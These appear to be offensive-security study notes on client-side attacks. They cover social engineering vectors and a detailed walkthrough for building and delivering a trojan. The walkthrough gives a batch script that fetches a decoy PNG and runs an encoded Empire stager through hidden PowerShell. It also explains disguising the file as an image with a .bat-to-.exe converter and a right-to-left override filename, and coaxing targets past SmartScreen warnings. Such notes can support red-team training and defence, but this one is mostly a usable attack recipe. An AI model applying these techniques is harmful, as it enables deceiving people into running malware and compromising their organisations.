# Client Side Attacks

Client-side attacks aim to exploit vulnerabilities or misconfigurations in client-side programs or to exploit the employees of companies to establish an initial foothold into an organizations networks.

These attacks are very effective and prevelent as humans are the weak link in an organizations security.

We are trying to get onto a client device in a network rather than attacking servers.

>[!IMPORTANT]
>The attacks we run will depend on the devices and software installed on the client machines

Due to the fact that client-side attacks usually need some kind of human interaction in order to work, social engineering comes into play when using them.

## Introductary Example

To get a better idea of how a client-side attack can work - consider the following fictitious but illustrative example.

We - the attackers - want to gain access to a company called Teszzla. We will use a client-side attack rather than a server attack to attempt to do this.

First, we research Teszzla using publicly available data. We look through their websites, social media and job postings. During this research we harvest names of employees and their roles in the company. We then gather data about the technology being used by Teszzla.

Next, we identify the best targets - employees - in Teszzla. We look for those who probably have access to the data we are after. We focus our recon on these employees and find out as much as we can about them using Open Source INTelligence methods.

After this, we develop our reources - maybe a trojan which uses a .png image or .pdf document tailored to our target. This will take into consideration what we know about the target *and* what we know about the technology being used by them.

We then establish the infrastructure we need in order to deliver the payload - maybe we clone a website, link it to a sneaky domain and start a file-sharing service along with a web server on the cloud.

Next, we work on creating a *pretext* for delivering the payload to the target - this might be a spear-phishing email to them which has a link to a malicious website which we have created. The malicious website may well be serving our trojans.

After this, we use social engineering techniques to deliver the payload and get the target to download a trojan.

Maybe the target downloads and opens the trojan. Malicious code will then execute on the *client* machine used by the target and call back to a *Command and Control* server which we have running on the cloud.

We have now gained access to the internal network of Teszzla via a client-side attack - notice how we had to hack a person as well as a computer.

The process of *post exploitation* begins.

### Client-Side Attack Methodology

Taking into consideration the example above - we can put together a high-level attack chain for a client-side attack - see it as a workflow :smiley:

- Reconnaissance
- Target Identification
- Resource Development
- Delivery
- Execution
- Post-Exploitation

## Client-Side Attack Vectors

Here are some common client-side attack vectors we can use to gain initial access to target networks.

### Social Engineering

The process of getting people to do things we want them to do which they wouldnt ordinarily do. We will go into these techniques in greater detail later - but as an overview social engineering includes:

- Phishing Emails
    - crafted emails to trick targets into clicking on malicious links or download malicious files
- Spear-Phishing Emails
    - phishing emails which are highly targeted due to extensive recon of the target
- Social Media Engineering
    - fake profiles used to establish connections and trust with targets and then get them to click on malicious links or downloads
- Pretexting
    - establishing a narrative to use to deceive the target
- Baiting
    - enticing the target to click on a malicious link or download malicious files
- Tailgating
    - establishing a relationship with the target and then using it to physically gain access to an organizations premises and therefore internal network

### Malicious Files

These can be any kind of file - .png .pdf. .docx etc - which have malicious content designed to execute once the file has been opened.

### Drive-By Downloads

We poison a compromised website or we create a website which contains malicious content - this is crafted so it is automatically downloaded and executed when a target visits the website.

### Watering Hole Attacks

Injecting malicious code to websites which we know are visited by the target.

### USB Attacks

We leave a poisoned USB stick somewhere a target will find it - the hope is they will be curious and mount it on a company machine. The stick will be infected with malware which automatically executes once the device has been mounted.

### Exploit Kits

These are kits such as BEEF which exploit client-side software - they make our life easier as attackers.

## Resource Development

In this section we will be looking at how we can craft malicious resources to use against our targets.

### Developing Trojan Horses

We all know the story of the original Trojan Horse from Greek mythology. In cyber security a trojan is simply a malicious piece of code - for example a meterpreter reverse shell, empire stager, keylogger, custom reverse shell - which runs in the background behind an innocent file such as a .png .pdf or .exe

The idea is that the target will see the innocent side but not the malicious one - no sweaty Greek men need to be involved :relieved: 

Essentially a trojan needs to look and act like a normal file but at the same time execute malicious code in the background.

>[!NOTE]
>There are lots of ways to develop and deliver trojans - we will cover some of them which will hopefully be of use :smiley: 

#### Using Powershell in a Batch Script

The idea is simple - we will create a .bat script which will use powershell to download and execute an innocent file and then execute malicious code.

Once we have this working we will polish the look of the trojan to make it as believable as possible. Social engineering will greatly assist in getting the target to open the trojan but there are some tricks we can use to make it more likely that they will fall for it.

##### Serving Necessary Files

In order for this method to work the trojan will need to be able to download the necessary files from somewhere. We can serve these ourselves using an opensource file sharing service called [pwndrop](https://github.com/kgretzky/pwndrop)

>[!NOTE]
>We can use a cloud server to host pwndrop but in these notes we are working on a local area network

After we have cloned the pwndrop repo and navigated into it we can use `make` to prepare it for installation. We can then use `make install` to install it.

>[!IMPORTANT]
>We need to have go installed on our system for the installation of pwndrop to work - we can get this on kali using `sudo apt install golang-go`

Once we have installed pwndrop it will be running. We can stop, start and check its status using `service` commands such as `sudo service pwndrop stop` or we can use `/usr/local/pwndrop/pwndrop/stop`

We can now access the login panel of pwndrop via a web browser. Since we are working on a LAN we can just use the IP address of the server or `localhost` but if we have installed pwndrop on a cloud server which has a domain name associated with it we can use the domain name.

The admin panel is found at `http://localhost/pwndrop/` - we will need to change `localhost` to a domain name if working with it on the cloud and a domain we have purchased.

>[!TIP]
>The path to the admin panel can be changed in the settings once we have logged into pwndrop

When we first log into pwndrop we will need to create a username:password which we can use for subsequent access to it.

It is very easy to use and is mostly self explanatory.

One thing to notice is how pwndrop by default adds gibberish into the path of uploaded files. I find this makes urls less believable and therefore like to delete it - this can be done in the settings for each individual file.

![pwndrop1](/images/3.png)

In this example we are creating a trojan for a target who is interested in astrophotography. The .png is therefore related to this interest.

We will be using a simple empire stager as the malicious payload.

![empire1](/images/1.png)

![empire2](/images/2.png)

With our pwndrop server now serving we can access the .png file we need for the frontend of our trojan.

![pwndrop2](/images/4.png)

##### Creating the Batch Script

The .bat script we create will first of all use `cd %TEMP%` to navigate into the `Temp` directory. This is so the target will not see suspicious files appearing on their file system - most people never navigate to it.

It will then use powershell to download the innocent .png file we are serving. Since this powershell command will be executed from within a batch script we will need to explicitly state we want to use powershell: `Powershell -Command "Invoke-WebRequest 'http://192.168.56.101/witch-head.png' -OutFile 'witch-head.png'"`

We will then open the .png file so the target believes they have just opened it in a normal way even though they have not. We can open it by simply using `witch-head.png`

Next we will execute the malicious code which in this case is the base64 encoded empire multi stager.

![trojan1](/images/5.png)

The following code is the complete batch script as run in this example:

```
cd %TEMP%
Powershell -Command "Invoke-WebRequest 'http://192.168.56.101/witch-head.png' -OutFile 'witch-head.png'"
witch-head.png
powershell -nop -sta -w 1 -enc SQB<SNIP>AFM
```

Once we have crafted our malicious batch script and saved it as a .bat file we can try executing it.

![trojan3](/images/7.png)

![trojan4](/images/8.png)

At this point we have a working trojan - okay - not many if any people are going to open that dodgy looking batch file - though with good social engineering some will - so we will next work on making it look more legitimate.

##### Converting .bat to .exe and Adding an Icon

At this point we have a trojan which works but looks suspicious.

![trojan6](/images/6.png)

We want to make it look more like a .png as in this example we are using a .png file as the cover for the malicious code.

We can turn the .bat script into an .exe file using a .bat to .exe [conversion tool](https://github.com/tokyoneon/B2E)

This is a good tool because we can add an .ico to make the file look more like a .png and we can choose to make `Exe-Format` option `(Invisible)` which means the target will not see the script run.

>[!TIP]
>We can easily create an .ico file using an online .png to .ico conversion tool - there are lots of them

![trojan7](/images/9.png)

Once we have finished converting the .bat file to an .exe file as described above the trojan will look more believable.

![trojan8](/images/10.png)

>[!NOTE]
>Windows by default does not show file extensions so we do not at this point need to worry about .exe showing and scaring the target - there is a trick we can use to help with this which will soon see

If we open the trojan now we find that no warnings pop up and no scary scripts can be seen running - we just see what the target would expect to see - a .png image of the witch-head nebula.

![trojan9](/images/11.png)

The malicious code has still been executed in the background and we find a new agent has checked into our empire C2 server.

![trojan10](/images/12.png)

This means our trojan is more likely to be executed by the target.

The next question relates to delivery methods. If we have managed to get the trojan to the target in a way which does not use the internet - for example on a USB stick - then the trojan will work as we have seen.

In most cases though we will be delivering the trojan using the internet in some way or form. This raises the problem of the browser showing the real file extension of .exe when the trojan is being downloaded and Defender SmartScreen warning the target that they are opening an executable. We will look at some ways we can mitigate these problems next.

##### Dealing with the .exe Extension and Pesky Defender SmartScreen

When we upload our trojan to pwndrop we see that it has an .exe file extension after our .png fake one.

![trojan11](/images/13.png)

If the target downloads this as it is they will be able to see the .exe file extension since the browswer will display it on the file name.

We can get around this by creating a zip archive of several files. In this example we zip three pictures of astrophotography. Since this is Proof Of Concept we only make one of them a trojan. In reality we would make them all trojans.

![trojan12](/images/14.png)

![trojan13](/images/15.png)

![trojan14](/images/16.png)

The next problem is Defender SmartScreen giving the target a warning not to open the file which has been downloaded because it is an unrecognised app.

We can use social engineering techniques to get around this.

![trojan15](/images/17.png)

![trojan16](/images/18.png)

Another problem this causes is that the scary .exe file extension has reared its ugly head again. Fortunately we can use a trick to hide it.

We will use the *right-to-left override* character which can be found online in different places - one such place can be found [here](https://unicode-explorer.com/c/202E)

The idea is simple - we will think of a word which ends exe or nearly ends exe - in this case we use annexe hoping the target doesnt think too much of it - maybe an annexe of photos!

We then craft a file name such as `astro-backyard-1-anngnp.exe`

The `gnp.exe` part will have the right-to-left override character applied to it so it will read as `exe.png` which will make the whole sneaky filename read as `astro-backyard-1-annexe.png`

![trojan17](/images/19.png)

![trojan18](/images/20.png)

![trojan19](/images/21.png)

![trojan20](/images/22.png)

The target will still be warned when they open the trojan but the scary .exe file extension is no longer visible - it looks like a legit .png because SmartScreen doesnt pick up on the fact that the RLO character has been used.

In our social engineering we can play on the fact that the .png is from an unknown publisher and this is why Defender gives a warning. There are other techniques we can use too - these are to be covered in the social engineering section of these notes :smiling_imp: 

![trojan21](/images/23.png)

>[!TIP]
>We dont have to use a word which ends exactly exe - we can just add an e to words which end ex - targets will tend to see this as a typo - especially if they are very keen to open the image - why does `sexe` spring to mind? We could also register a domain name such as `galexe` and use it in our file names